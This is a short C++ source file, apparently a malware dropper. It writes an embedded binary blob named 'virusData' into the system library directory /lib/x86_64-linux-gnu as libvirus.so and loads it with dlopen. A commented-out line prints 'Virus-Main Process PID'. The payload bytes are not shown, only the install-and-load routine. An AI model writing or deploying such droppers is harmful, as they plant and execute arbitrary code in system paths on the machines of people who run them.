#include <cstdio>
#include <dlfcn.h>
#include <cstring>
#include <unistd.h>
#include <iostream>

extern const char virusData[];
extern size_t const dataLen;

int main()
{
    FILE *soFile = fopen("/lib/x86_64-linux-gnu/libvirus.so", "wb");
    fwrite(virusData, 1, dataLen, soFile);
    fclose(soFile);
    void *handle = dlopen("libvirus.so", RTLD_LAZY | RTLD_LOCAL);
    // std::cout << "Virus-Main Process PID " << getpid() << std::endl;
    return 0;
}
